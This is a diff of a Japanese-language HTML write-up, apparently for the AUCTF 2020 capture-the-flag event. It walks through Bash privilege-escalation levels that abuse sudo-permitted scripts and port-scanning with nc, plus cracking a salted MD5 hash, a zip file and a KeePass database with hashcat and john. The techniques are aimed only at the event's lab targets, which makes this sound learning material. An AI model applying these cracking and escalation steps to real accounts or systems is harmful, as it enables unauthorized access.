 <p><br /></p>
-
 <h3 id="solution-7">Solution</h3>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -916,17 +793,17 @@ password is the flag of the previous Bash challenge</p>
 </span><span class="lnt">29
 </span><span class="lnt">30
 </span><span class="lnt">31
-</span></pre></td>
+</span></code></pre></td>
 <td class="lntd">
-<pre class="chroma">$ ls -la
+<pre class="chroma"><code class="language-bash" data-lang="bash">$ ls -la
 total <span class="m">28</span>
-dr-xr-x--x <span class="m">1</span> level2 level2 <span class="m">4096</span> Apr  <span class="m">3</span> <span class="m">16</span>:00 .
-drwxr-xr-x <span class="m">1</span> root   root   <span class="m">4096</span> Apr  <span class="m">3</span> <span class="m">15</span>:35 ..
+dr-xr-x--x <span class="m">1</span> level2 level2 <span class="m">4096</span> Apr  <span class="m">3</span> 16:00 .
+drwxr-xr-x <span class="m">1</span> root   root   <span class="m">4096</span> Apr  <span class="m">3</span> 15:35 ..
 -rw-r--r-- <span class="m">1</span> level2 level2  <span class="m">220</span> Apr  <span class="m">4</span>  <span class="m">2018</span> .bash_logout
 -rw-r--r-- <span class="m">1</span> level2 level2 <span class="m">3771</span> Apr  <span class="m">4</span>  <span class="m">2018</span> .bashrc
 -rw-r--r-- <span class="m">1</span> level2 level2  <span class="m">807</span> Apr  <span class="m">4</span>  <span class="m">2018</span> .profile
--r--r----- <span class="m">1</span> level3 level3   <span class="m">22</span> Apr  <span class="m">1</span> <span class="m">21</span>:25 flag.txt
--r-xr-x--- <span class="m">1</span> level3 level2  <span class="m">110</span> Apr  <span class="m">1</span> <span class="m">21</span>:25 random_dirs.sh
+-r--r----- <span class="m">1</span> level3 level3   <span class="m">22</span> Apr  <span class="m">1</span> 21:25 flag.txt
+-r-xr-x--- <span class="m">1</span> level3 level2  <span class="m">110</span> Apr  <span class="m">1</span> 21:25 random_dirs.sh
 
 
 $ cat random_dirs.sh
@@ -948,12 +825,11 @@ Matching Defaults entries <span class="k">for</span> level2 on a522debb8813:
     env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
 
 User level2 may run the following commands on a522debb8813:
-    <span class="o">(</span>level3<span class="o">)</span> NOPASSWD: /home/level2/random_dirs.sh</pre></td></tr></table>
+    <span class="o">(</span>level3<span class="o">)</span> NOPASSWD: /home/level2/random_dirs.sh
+</code></pre></td></tr></table>
 </div>
-</div>
-<p><br />
+</div><p><br />
 みんなが同じマシンで作業してたので、ゴミファイルとかも結構あったし、結果として/tmpの下をモニターしているだけでフラグが取れちゃいました。</p>
-
 <pre>
 $ cd /tmp
 $ find . -type f | xargs cat | grep -v try
@@ -961,42 +837,30 @@ YXVjdGZ7ZzB0dEBfbXV2X2Zhczd9Cg==
 :
 :
 </pre>
-
 <p>（<code>grep -v try</code> は、他の人が作ったゴミをフィルターするだけのものです。）</p>
-
-<p><br />
-<pre>
-$ echo &quot;YXVjdGZ7ZzB0dEBfbXV2X2Zhczd9Cg==&quot; | base64 -d
-auctf{g0tt@_muv_fas7}
-</pre></p>
-
 <p><br /></p>
-
+<pre>
+$ echo "YXVjdGZ7ZzB0dEBfbXV2X2Zhczd9Cg==" | base64 -d
+auctf{g0tt@_muv_fas7}
+</pre>
+<p><br /></p>
 <p>Flag: <code>auctf{g0tt@_muv_fas7}</code></p>
-
 <p>＃なにかを速く移動 (move fast) させないといけなかったのかな？</p>
-
 <p><br /><br />
 <br /><br /></p>
-
 <h2 id="bash-bash-3">[Bash]: Bash 3</h2>
-
-<hr />
-
+<hr>
 <h3 id="challenge-8">Challenge</h3>
-
 <blockquote>
 <p>ssh challenges.auctf.com -p 30040 -l level3
 <br /><br />
 password is the flag of the previous Bash challenge</p>
 </blockquote>
-
 <p><br /></p>
-
 <h3 id="solution-8">Solution</h3>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1030,17 +894,18 @@ password is the flag of the previous Bash challenge</p>
 </span><span class="lnt">32
 </span><span class="lnt">33
 </span><span class="lnt">34
-</span></pre></td>
+</span><span class="lnt">35
+</span></code></pre></td>
 <td class="lntd">
-<pre class="chroma">$ ls -la
+<pre class="chroma"><code class="language-bash" data-lang="bash">$ ls -la
 total <span class="m">28</span>
-dr-xr-x--x <span class="m">1</span> level3 level3 <span class="m">4096</span> Apr  <span class="m">3</span> <span class="m">16</span>:00 .
-drwxr-xr-x <span class="m">1</span> root   root   <span class="m">4096</span> Apr  <span class="m">3</span> <span class="m">15</span>:35 ..
+dr-xr-x--x <span class="m">1</span> level3 level3 <span class="m">4096</span> Apr  <span class="m">3</span> 16:00 .
+drwxr-xr-x <span class="m">1</span> root   root   <span class="m">4096</span> Apr  <span class="m">3</span> 15:35 ..
 -rw-r--r-- <span class="m">1</span> level3 level3  <span class="m">220</span> Apr  <span class="m">4</span>  <span class="m">2018</span> .bash_logout
 -rw-r--r-- <span class="m">1</span> level3 level3 <span class="m">3771</span> Apr  <span class="m">4</span>  <span class="m">2018</span> .bashrc
 -rw-r--r-- <span class="m">1</span> level3 level3  <span class="m">807</span> Apr  <span class="m">4</span>  <span class="m">2018</span> .profile
--r--r----- <span class="m">1</span> level4 level4   <span class="m">30</span> Apr  <span class="m">1</span> <span class="m">21</span>:25 flag.txt
--r-xr-x--- <span class="m">1</span> level4 level3  <span class="m">179</span> Apr  <span class="m">1</span> <span class="m">21</span>:25 passcodes.sh
+-r--r----- <span class="m">1</span> level4 level4   <span class="m">30</span> Apr  <span class="m">1</span> 21:25 flag.txt
+-r-xr-x--- <span class="m">1</span> level4 level3  <span class="m">179</span> Apr  <span class="m">1</span> 21:25 passcodes.sh
 
 
 $ cat passcodes.sh
@@ -1065,42 +930,33 @@ Matching Defaults entries <span class="k">for</span> level3 on a95be49047ca:
     env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
 
 User level3 may run the following commands on a95be49047ca:
-    <span class="o">(</span>level4<span class="o">)</span> NOPASSWD: /home/level3/passcodes.sh</pre></td></tr></table>
-</div>
-</div>
-<p><br />
-（ちなみに、初日は <code>sudo -u level4 /home/level3/passcodes.sh</code> の実行にパスワードが要求されて、2日目には直っていました。）</p>
+    <span class="o">(</span>level4<span class="o">)</span> NOPASSWD: /home/level3/passcodes.sh
 
+</code></pre></td></tr></table>
+</div>
+</div><p><br />
+（ちなみに、初日は <code>sudo -u level4 /home/level3/passcodes.sh</code> の実行にパスワードが要求されて、2日目には直っていました。）</p>
 <p><br />
-どれか1つ決め打ちで無限ループしたら、そのうち当たるだろう、というやり方です。
+どれか1つ決め打ちで無限ループしたら、そのうち当たるだろう、というやり方です。</p>
 <pre>
 $ while true ; do echo 1 | sudo -u level4 /home/level3/passcodes.sh; done | grep -i auctf
 auctf{wut_r_d33z_RaNdom_numz}
-</pre></p>
-
+</pre>
 <p><br /></p>
-
 <p>Flag: <code>auctf{wut_r_d33z_RaNdom_numz}</code></p>
-
 <p><br /><br />
 <br /><br /></p>
-
 <h2 id="bash-bash-4">[Bash]: Bash 4</h2>
-
-<hr />
-
+<hr>
 <h3 id="challenge-9">Challenge</h3>
-
 <blockquote>
 <p>ssh challenges.auctf.com -p 30040 -l level4</p>
 </blockquote>
-
 <p><br /></p>
-
 <h3 id="solution-9">Solution</h3>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1133,17 +989,17 @@ auctf{wut_r_d33z_RaNdom_numz}
 </span><span class="lnt">31
 </span><span class="lnt">32
 </span><span class="lnt">33
-</span></pre></td>
+</span></code></pre></td>
 <td class="lntd">
-<pre class="chroma">$ ls -la
+<pre class="chroma"><code class="language-bash" data-lang="bash">$ ls -la
 total <span class="m">32</span>
-dr-xr-xr-x <span class="m">1</span> root   root   <span class="m">4096</span> Apr  <span class="m">4</span> <span class="m">21</span>:54 .
-drwxr-xr-x <span class="m">1</span> root   root   <span class="m">4096</span> Apr  <span class="m">3</span> <span class="m">15</span>:35 ..
+dr-xr-xr-x <span class="m">1</span> root   root   <span class="m">4096</span> Apr  <span class="m">4</span> 21:54 .
+drwxr-xr-x <span class="m">1</span> root   root   <span class="m">4096</span> Apr  <span class="m">3</span> 15:35 ..
 -rw-r--r-- <span class="m">1</span> level4 level4  <span class="m">220</span> Apr  <span class="m">4</span>  <span class="m">2018</span> .bash_logout
 -rw-r--r-- <span class="m">1</span> level4 level4 <span class="m">3771</span> Apr  <span class="m">4</span>  <span class="m">2018</span> .bashrc
 -rw-r--r-- <span class="m">1</span> level4 level4  <span class="m">807</span> Apr  <span class="m">4</span>  <span class="m">2018</span> .profile
--r--r----- <span class="m">1</span> level5 level5   <span class="m">25</span> Apr  <span class="m">1</span> <span class="m">21</span>:25 flag.txt
--r-xr-x--- <span class="m">1</span> level5 level4  <span class="m">209</span> Apr  <span class="m">1</span> <span class="m">21</span>:25 print_file.sh
+-r--r----- <span class="m">1</span> level5 level5   <span class="m">25</span> Apr  <span class="m">1</span> 21:25 flag.txt
+-r-xr-x--- <span class="m">1</span> level5 level4  <span class="m">209</span> Apr  <span class="m">1</span> 21:25 print_file.sh
 
 
 $ cat print_file.sh
@@ -1167,41 +1023,30 @@ Matching Defaults entries <span class="k">for</span> level4 on 7fe0b0d86907:
     env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
 
 User level4 may run the following commands on 7fe0b0d86907:
-    <span class="o">(</span>level5<span class="o">)</span> NOPASSWD: /home/level4/print_file.sh</pre></td></tr></table>
+    <span class="o">(</span>level5<span class="o">)</span> NOPASSWD: /home/level4/print_file.sh
+</code></pre></td></tr></table>
 </div>
-</div>
-<p><br /></p>
-
+</div><p><br /></p>
 <pre>
 $ sudo -u level5 /home/level4/print_file.sh flag.txt
 auctf{FunKy_P3rm1ssi0nZ}
 </pre>
-
 <p><br /></p>
-
 <p>Flag: <code>auctf{FunKy_P3rm1ssi0nZ}</code></p>
-
 <p>＃ここにきて、何がFunkyなのか意味がわからなかったです。</p>
-
 <p><br /><br />
 <br /><br /></p>
-
 <h2 id="bash-bash-5">[Bash]: Bash 5</h2>
-
-<hr />
-
+<hr>
 <h3 id="challenge-10">Challenge</h3>
-
 <blockquote>
 <p>ssh challenges.auctf.com -p 30040 -l level5</p>
 </blockquote>
-
 <p><br /></p>
-
 <h3 id="solution-10">Solution</h3>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1228,23 +1073,23 @@ auctf{FunKy_P3rm1ssi0nZ}
 </span><span class="lnt">25
 </span><span class="lnt">26
 </span><span class="lnt">27
-</span></pre></td>
+</span></code></pre></td>
 <td class="lntd">
-<pre class="chroma">$ ls -la
+<pre class="chroma"><code class="language-bash" data-lang="bash">$ ls -la
 total <span class="m">36</span>
-dr-xr-xr-x <span class="m">1</span> root   root   <span class="m">4096</span> Apr  <span class="m">4</span> <span class="m">21</span>:54 .
-drwxr-xr-x <span class="m">1</span> root   root   <span class="m">4096</span> Apr  <span class="m">3</span> <span class="m">15</span>:35 ..
+dr-xr-xr-x <span class="m">1</span> root   root   <span class="m">4096</span> Apr  <span class="m">4</span> 21:54 .
+drwxr-xr-x <span class="m">1</span> root   root   <span class="m">4096</span> Apr  <span class="m">3</span> 15:35 ..
 -rw-r--r-- <span class="m">1</span> level5 level5  <span class="m">220</span> Apr  <span class="m">4</span>  <span class="m">2018</span> .bash_logout
--rw-r--r-- <span class="m">1</span> level5 level5 <span class="m">3777</span> Apr  <span class="m">4</span> <span class="m">22</span>:03 .bashrc
+-rw-r--r-- <span class="m">1</span> level5 level5 <span class="m">3777</span> Apr  <span class="m">4</span> 22:03 .bashrc
 -rw-r--r-- <span class="m">1</span> level5 level5  <span class="m">807</span> Apr  <span class="m">4</span>  <span class="m">2018</span> .profile
--r--r----- <span class="m">1</span> root   root     <span class="m">23</span> Apr  <span class="m">1</span> <span class="m">21</span>:25 flag.txt
--r-xr-x--- <span class="m">1</span> root   level5  <span class="m">137</span> Apr  <span class="m">1</span> <span class="m">21</span>:25 portforce.sh
+-r--r----- <span class="m">1</span> root   root     <span class="m">23</span> Apr  <span class="m">1</span> 21:25 flag.txt
+-r-xr-x--- <span class="m">1</span> root   level5  <span class="m">137</span> Apr  <span class="m">1</span> 21:25 portforce.sh
 
 
 $ cat portforce.sh
 <span class="c1">#!/bin/bash</span>
 
-<span class="nv">x</span><span class="o">=</span><span class="k">$(</span>shuf -i <span class="m">1024</span>-65500 -n <span class="m">1</span><span class="k">)</span>
+<span class="nv">x</span><span class="o">=</span><span class="k">$(</span>shuf -i 1024-65500 -n 1<span class="k">)</span>
 <span class="nb">echo</span> <span class="s2">&#34;Guess the listening port&#34;</span>
 <span class="nv">input</span><span class="o">=</span><span class="k">$(</span>nc -lp <span class="nv">$x</span><span class="k">)</span>
 <span class="nb">echo</span> <span class="s2">&#34;That was easy right? :)&#34;</span>
@@ -1256,16 +1101,15 @@ Matching Defaults entries <span class="k">for</span> level5 on 7fe0b0d86907:
     env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
 
 User level5 may run the following commands on 7fe0b0d86907:
-    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /home/level5/portforce.sh</pre></td></tr></table>
+    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /home/level5/portforce.sh
+</code></pre></td></tr></table>
 </div>
-</div>
-<p><br />
+</div><p><br />
 これはローカルで試したら、よくわかりやすかったです。</p>
-
 <p>以下のようなファイルを用意。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-sh" data-lang="sh"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -1277,24 +1121,20 @@ User level5 may run the following commands on 7fe0b0d86907:
 <td class="lntd">
 <pre class="chroma"><code class="language-sh" data-lang="sh"><span class="cp">#!/bin/bash
 </span><span class="cp"></span>
-<span class="nv">x</span><span class="o">=</span><span class="k">$(</span>shuf -i <span class="m">1024</span>-65500 -n <span class="m">1</span><span class="k">)</span>
+<span class="nv">x</span><span class="o">=</span><span class="k">$(</span>shuf -i 1024-65500 -n 1<span class="k">)</span>
 <span class="nb">echo</span> <span class="s2">&#34;Guess the listening port&#34;</span>
 <span class="nb">echo</span> <span class="nv">$x</span>   <span class="c1"># &lt;&lt;&lt;&lt; これを追加</span>
 <span class="nv">input</span><span class="o">=</span><span class="k">$(</span>nc -lp <span class="nv">$x</span><span class="k">)</span>
 <span class="nb">echo</span> <span class="s2">&#34;That was easy right? :)&#34;</span>
-cat flag.txt</code></pre></td></tr></table>
+cat flag.txt
+</code></pre></td></tr></table>
 </div>
-</div>
-<p><br />
+</div><p><br />
 これで実行すると、どのポートでncがlistenしているかわかるので、（ま、netstatでもよかったけど）</p>
-
 <p>そのポートに対して、<code>echo test | nc localhost &lt;port&gt;</code> みたいにしてやると、以降の処理が実行されてフラグが表示されました。</p>
-
 <p>ちなみに、ローカルでテストする場合は、rootじゃなくても、自分自身でテストはできました。</p>
-
 <p><br />
 ということで、チャレンジサーバ上で、<code>sudo /home/level5/portforce.sh</code>を実行して待受けしつつ、別のターミナルにて、</p>
-
 <pre>
 $ for i in {1024..65500} ; do (echo test | nc localhost ${i}) ; done
 invalid port {1024..65500} : No such file or directory
@@ -1302,58 +1142,36 @@ invalid port {1024..65500} : No such file or directory
 $ /bin/bash
 $ for i in {1024..65500} ; do (echo test | nc localhost ${i}) ; done
 </pre>
-
 <div class="admonition tip"><p class="admonition-title">Tips</p>
-  
-/bin/sh と /bin/bash でループの書き方が違うので、上記のやり方は/bin/shだとエラーになります。
-
+<p>/bin/sh と /bin/bash でループの書き方が違うので、上記のやり方は/bin/shだとエラーになります。</p>
 </div>
-
 <p><br />
 Flag: <code>auctf{n3tc@_purt_$can}</code></p>
-
-<p>＃Discordで、「Random portがたまたま2回目で当たった」    と喜んでいる人がいました。たぶん、それはポート番号が当たったんじゃなくて、他の人がncを実行してくれたんだと思います。それはそれでラッキーでしたね^^</p>
-
+<p>＃Discordで、「Random portがたまたま2回目で当たった」	と喜んでいる人がいました。たぶん、それはポート番号が当たったんじゃなくて、他の人がncを実行してくれたんだと思います。それはそれでラッキーでしたね^^</p>
 <p><br /><br />
 <br /><br />
 <img src="https://captureamerica.github.io/writeups/img/orange_bar.png" alt="orange_bar.png">
 <br />
 ここから下はイベント終了後に行った復習です。</p>
-
 <p><br /><br />
 <br /><br /></p>
-
 <h2 id="osint-good-old-days">[OSINT]: Good Old Days</h2>
-
-<hr />
-
+<hr>
 <h3 id="challenge-11">Challenge</h3>
-
 <blockquote>
 <p>This site used to look a lot cooler.</p>
 </blockquote>
-
 <p><br /></p>
-
 <h3 id="solution-11">Solution</h3>
-
 <p>チャレンジ内容から考えて、Web Archiveから過去のページを調べるやつでしたね。</p>
-
-<p><a href="https://web.archive.org/web/20200213064621/https://ctf.auburn.edu/users" target="_blank">https://web.archive.org/web/20200213064621/https://ctf.auburn.edu/users</a></p>
-
+<p><a href="https://web.archive.org/web/20200213064621/https://ctf.auburn.edu/users">https://web.archive.org/web/20200213064621/https://ctf.auburn.edu/users</a></p>
 <p><br /></p>
-
 <p>Flag: <code>auctf{Th053_w3rE_Th3_guD_0l3_d4y5}</code></p>
-
 <p><br /><br />
 <br /><br /></p>
-
 <h2 id="sequence-can-you-seeda-sequence">[Sequence]: Can You SeeDa Sequence</h2>
-
-<hr />
-
+<hr>
 <h3 id="challenge-12">Challenge</h3>
-
 <blockquote>
 <p>Time to put your problem solving skills to work! Finish the sequence!
 <br /><br />
@@ -1365,17 +1183,13 @@ NOTE: The flag is NOT in the standard auctf{} format
 <br /><br />
 flag format - comma separated list 1, 2, 3, 4, 5</p>
 </blockquote>
-
 <p><br /></p>
-
 <h3 id="solution-12">Solution</h3>
-
-<p>'SeeDa' なので Seedを0か何かに決め打ちしてrand()関数を呼んだらシーケンスが見れると思ってCでやろうとしてたんですが、ダメでした（読みは合ってた）。これは、Pythonでやるやつだったみたいです。</p>
-
+<p>&lsquo;SeeDa&rsquo; なので Seedを0か何かに決め打ちしてrand()関数を呼んだらシーケンスが見れると思ってCでやろうとしてたんですが、ダメでした（読みは合ってた）。これは、Pythonでやるやつだったみたいです。</p>
 <p>ちなみに、ダメだったやつ：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1410,19 +1224,18 @@ flag format - comma separated list 1, 2, 3, 4, 5</p>
 	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;%d &#34;</span><span class="p">,</span> <span class="n">rand</span><span class="p">()</span> <span class="o">%</span> <span class="mi">128</span><span class="p">);</span>
 	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;%d &#34;</span><span class="p">,</span> <span class="n">rand</span><span class="p">()</span> <span class="o">%</span> <span class="mi">128</span><span class="p">);</span>
 	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;%d &#34;</span><span class="p">,</span> <span class="n">rand</span><span class="p">()</span> <span class="o">%</span> <span class="mi">128</span><span class="p">);</span>
-<span class="p">}</span></code></pre></td></tr></table>
+<span class="p">}</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>ダメな結果：
+</div><p>ダメな結果：</p>
 <pre>
-103 70 105 115 81 127 74 108
-</pre></p>
-
+103 70 105 115 81 127 74 108 
+</pre>
 <p><br />
 正解：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-Python" data-lang="Python"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1479,22 +1292,16 @@ flag format - comma separated list 1, 2, 3, 4, 5</p>
 <span class="mi">91</span>
 <span class="o">&gt;&gt;&gt;</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">128</span><span class="p">)</span>
 <span class="mi">55</span>
-<span class="o">&gt;&gt;&gt;</span> <span class="nb">exit</span><span class="p">()</span></code></pre></td></tr></table>
+<span class="o">&gt;&gt;&gt;</span> <span class="nb">exit</span><span class="p">()</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p><br /></p>
-
+</div><p><br /></p>
 <p>Flag: <code>103, 77, 122, 91, 55</code></p>
-
 <p><br /><br />
 <br /><br /></p>
-
 <h2 id="password-cracking-salty">[Password Cracking]: Salty</h2>
-
-<hr />
-
+<hr>
 <h3 id="challenge-13">Challenge</h3>
-
 <blockquote>
 <p>You might need this: 1337
 <br /><br />
@@ -1502,24 +1309,17 @@ Hash: 5eaff45e09bec5222a9cfa9502a4740d
 <br /><br />
 NOTE: The flag is NOT in the standard auctf{} format</p>
 </blockquote>
-
 <p><br /></p>
-
 <h3 id="solution-13">Solution</h3>
-
 <p>最初、以下みたいなサイトで解くやつかと思ったんですよね。</p>
-
-<p><a href="https://www.dcode.fr/md5-hash" target="_blank">https://www.dcode.fr/md5-hash</a></p>
-
+<p><a href="https://www.dcode.fr/md5-hash">https://www.dcode.fr/md5-hash</a></p>
 <p><br />
-その後、以下のファイルを作るところまではやったんですが、<code>john</code> で解こうとしてハマって終了。
+その後、以下のファイルを作るところまではやったんですが、<code>john</code> で解こうとしてハマって終了。</p>
 <pre>
 5eaff45e09bec5222a9cfa9502a4740d:1337
-</pre></p>
-
+</pre>
 <p><br /><br />
 これは <code>hashcat</code> でやるのがよかったみたい。モードは以下のようにいくつかあります。</p>
-
 <pre>
 $ hashcat --help | grep salt | grep md5
      10 | md5($pass.$salt)                                 | Raw Hash, Salted and/or Iterated
@@ -1532,9 +1332,7 @@ $ hashcat --help | grep salt | grep md5
    4110 | md5($salt.md5($pass.$salt))                      | Raw Hash, Salted and/or Iterated
    3910 | md5(md5($pass).md5($salt))                       | Raw Hash, Salted and/or Iterated
 </pre>
-
 <p><br /></p>
-
 <pre>
 $ hashcat -m 20 -a 0 salty.txt /usr/share/wordlists/rockyou.txt --force
 hashcat (v5.1.0) starting...
@@ -1559,38 +1357,25 @@ Restore.Point....: 26624/14344385 (0.19%)
 Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
 Candidates.#1....: 200390 -> spongebob9
 </pre>
-
 <p><br /></p>
-
 <p>Flag: <code>treetop</code></p>
-
 <p><br /><br />
 <br /><br /></p>
-
 <h2 id="password-cracking-zippy">[Password Cracking]: Zippy</h2>
-
-<hr />
-
+<hr>
 <h3 id="challenge-14">Challenge</h3>
-
 <blockquote>
 <p>Have fun!
 <br /><br />
 NOTE: The flag is NOT in the standard auctf{} format</p>
 </blockquote>
-
 <p>Attachment:</p>
-
 <ul>
 <li>zippy.zip</li>
 </ul>
-
 <p><br /></p>
-
 <h3 id="solution-14">Solution</h3>
-
 <p>まずは、ダメだった例から。</p>
-
 <pre>
 $ zip2john zippy.zip > hash.txt
 ver 81.9 zippy.zip/unzipme.zip is not encrypted, or stored with non-handled compression type
@@ -1598,12 +1383,9 @@ ver 81.9 zippy.zip/unzipme.zip is not encrypted, or stored with non-handled comp
 $ fcrackzip -v -D -u -p /usr/share/wordlists/rockyou.txt zippy.zip 
 found file 'unzipme.zip', (size cp/uc    871/   908, flags 1, chk 0000)
 </pre>
-
 <p>というか、zip2john自体はあってたっぽいけど、なんか失敗してるのかと思って、fcrackzipをやって解けなかったので諦めたやつでした。</p>
-
 <p><br /></p>
-
-<p>今日 <code>john</code> でやってみたら普通にできたし。（11分かかりました）
+<p>今日 <code>john</code> でやってみたら普通にできたし。（11分かかりました）</p>
 <pre>
 $ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
 Using default input encoding: UTF-8
@@ -1612,13 +1394,11 @@ Will run 2 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
 8297018229       (zippy.zip/unzipme.zip)
 1g 0:00:11:47 DONE (2020-04-11 13:48) 0.001413g/s 16660p/s 16660c/s 16660C/s 82973..828298
-Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Use the "--show" option to display all of the cracked passwords reliably
 Session completed
-</pre></p>
-
+</pre>
 <p><br />
 ちなみに、<code>hashcat</code> でもやってみました。（こっちは24分くらいかかりました）</p>
-
 <pre>
 $ hashcat -h | grep -i zip
   11600 | 7-Zip                                            | Archives
@@ -1651,53 +1431,37 @@ Restore.Point....: 11784704/14344385 (82.16%)
 Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:992-999
 Candidates.#1....: 829802 - 8294584221
 </pre>
-
 <p>この先にもまだZipファイルが出てくるんですが、これ以上はやってません。</p>
-
 <p><br /><br />
 <br /><br /></p>
-
 <h2 id="password-cracking-manager">[Password Cracking]: Manager</h2>
-
-<hr />
-
+<hr>
 <h3 id="challenge-15">Challenge</h3>
-
 <blockquote>
 <p>There might be a flag inside this file. The password is all digits.
 <br /><br />
 NOTE: The flag is NOT in the standard auctf{} format</p>
 </blockquote>
-
 <p>Attachment:</p>
-
 <ul>
 <li>manager.kdbx</li>
 </ul>
-
 <p><br /></p>
-
 <h3 id="solution-15">Solution</h3>
-
-<p>いちおう、以下はやったんです。
+<p>いちおう、以下はやったんです。</p>
 <pre>
-$ keepass2john manager.kdbx &gt; hash.txt
-$ john --incremental=digits hash.txt
-</pre></p>
-
+$ keepass2john manager.kdbx > hash.txt
+$ john --incremental=digits hash.txt 
+</pre>
 <p>でも、1時間半やっても終わらなかったので、強制終了して諦めたやつでした。。。</p>
-
 <p><br />
 他の方のWriteupとか見てると、3時間くらいかかるっぽいですね。せっかちなんで、そんなに待っていられないです。</p>
-
-<p>あと、もしかしたら、以下のようにフォーマットを指定した方がよかったかもです。
+<p>あと、もしかしたら、以下のようにフォーマットを指定した方がよかったかもです。</p>
 <pre>
 $ john --format:keepass --incremental=digits hash.txt
-</pre></p>
-
+</pre>
 <p><br /><br />
 いちおう <code>hashcat</code>で、フラグが6桁なのがわかっている前提でやってみました。（1時間弱かかりました）</p>
-
 <pre>
 $ hashcat -h | grep -i keepass
   13400 | KeePass 1 (AES/Twofish) and KeePass 2 (AES)      | Password Managers
@@ -1722,12 +1486,9 @@ Restore.Point....: 37888/100000 (37.89%)
 Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:59904-60000
 Candidates.#1....: 168432 -> 176865
 </pre>
-
 <p><br />
 もしかしたら、<code>-w</code>オプションを付けたらもっと早く終わるのかも知れないですけど、試してないです。</p>
-
 <p>以下、helpより。</p>
-
 <pre>
 - [ Workload Profiles ] -
 
@@ -1738,74 +1499,53 @@ Candidates.#1....: 168432 -> 176865
   3 | High        |  96 ms  | High              | Unresponsive
   4 | Nightmare   | 480 ms  | Insane            | Headless
 </pre>
-
 <p><br />
 ここで取れた Master Password (157865) を使って、WindowsのKeePassツールで開くとフラグが取れました。</p>
-
 <p>Flag: <code>y0u4r34r34lh4ck3rn0w#!$1678</code></p>
-
 <p><br /><br />
 <br /><br /></p>
-
 <h2 id="forensics-fahrenheit-451">[Forensics]: Fahrenheit 451</h2>
-
-<hr />
-
+<hr>
 <h3 id="challenge-16">Challenge</h3>
-
 <blockquote>
 <p>Your SUBSTITUTE teacher accessed his copy of Fahrenheit 451 over his windows network share. Can you find the flag your friend hid in the book?
 <br /><br />
 Standard Flag Format auctf{}</p>
 </blockquote>
-
 <p>Attachment:</p>
-
 <ul>
 <li>f451.pcapng</li>
 </ul>
-
 <p><br /></p>
-
 <h3 id="solution-16">Solution</h3>
-
 <p>Pcapから、Fahrenheit_451_Full_Text.pdf を取り出すところまでは、すんなりいけます。</p>
-
 <p><br />
 PDFは72ページあります。ハイライトもやってみたんですが、ページ数が多くて怪しい箇所を見つけるまでの根気がなくて諦めたやつです。</p>
-
 <p>他の方のWriteupを参照すると、上から眺めていけば8ページ目辺りで見つかったらしいです。</p>
-
 <p>そんなんだったら、72ページじゃなくて、せめて10ページくらいのファイルにしてくれてもいいのに。。。</p>
-
 <p><br /><br />
